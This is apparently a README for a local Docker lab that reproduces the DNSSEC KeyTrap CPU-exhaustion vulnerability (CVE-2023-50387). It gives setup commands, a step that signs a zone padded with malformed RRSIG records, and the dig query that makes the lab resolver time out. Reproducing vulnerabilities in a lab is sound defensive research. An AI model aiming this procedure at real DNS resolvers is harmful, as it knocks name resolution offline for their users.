# DNSSec

## *DNS*sec KeyTrap Vulnerability (*CVE-2023-50387*)

This repository provides a minimal lab environment to replicate and analyze the *DNS*sec KeyTrap vulnerability (*CPU* exhaustion *DoS*) by generating a *DNS* zone containing multiple malformed *RRSIG* records.

### Prerequisites

Ensure Docker, Docker Compose, and the necessary BIND utilities are installed on your host system:

```sh
sudo apt update
sudo apt install bind9utils tmux
```

```sh
cd CVE-2023-50387
```

### Execution Step

1. **Generate Keys and Sign the Zone**    
Run the script to generate the *KSK/ZSK* keys, sign the target zone, and inject the payload *RRSIG* records:

```sh
python3 script.py
```

2. **Launch the Lab Environment**    
Rebuild and start the Docker containers with fresh volumes to load the updated zone files:

```sh
docker compose down -v && docker compose up --build -d
```

3. **Verify Baseline *DNS*sec Functionality**    
Query a benign record (a.a.test) to confirm that the resolver (10.10.0.3) is validating *DNS*sec correctly. Look for the ad (Authenticated Data) flag in the header:

```sh
$ docker compose exec -it attacker dig @10.10.0.3 a.a.test

; <<>> DiG 9.18.44 <<>> @10.10.0.3 a.a.test
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 9705
;; flags: qr rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
;; QUESTION SECTION:
;a.a.test.                      IN      A

;; ANSWER SECTION:
a.a.test.               86400   IN      A       10.10.0.4

;; Query time: 7 msec
;; SERVER: 10.10.0.3#53(10.10.0.3) (UDP)
;; WHEN: Mon Aug 17 19:56:19 UTC 2026
;; MSG SIZE  rcvd: 53
```

4. **Trigger the KeyTrap Vulnerability**    
Monitor CPU utilization in real time using tmux while sending the malicious query:

    - Open tmux and split the terminal:

    ```sh
    tmux
    ```

    Press `CTRL + B`, then `%` to split the window vertically.

    - In the right pane, monitor resource consumption:

    ```sh
    docker stats kt_resolver
    ```

    - In the left pane `CTRL + B` then `←`, send the exploit query:

    ```sh
    $ docker compose exec -it attacker dig @10.10.0.3 www.a.test

    ;; communications error to 10.10.0.3#53: timed out
    ;; communications error to 10.10.0.3#53: timed out
    ;; communications error to 10.10.0.3#53: timed out

    ; <<>> DiG 9.18.44 <<>> @10.10.0.3 www.a.test
    ; (1 server found)
    ;; global options: +cmd
    ;; no servers could be reached
    ```

## License

This project is licensed under the MIT License. See the `LICENSE` file for
the full license text.

### Third-Party Code

The `CVE-2023-50387/` component contains a portion of code derived from
[CVE-2023-50387](https://github.com/knqyf263/CVE-2023-50387) by Teppei Fukuda.

The derived code is distributed under the MIT License. The original copyright
and license notices are preserved in `THIRD-PARTY-NOTICES`.

### References

* Fukuda, T. — [CVE-2023-50387 / KeyTrap](https://github.com/knqyf263/CVE-2023-50387)
* [CVE-2023-50387](https://nvd.nist.gov/vuln/detail/CVE-2023-50387)
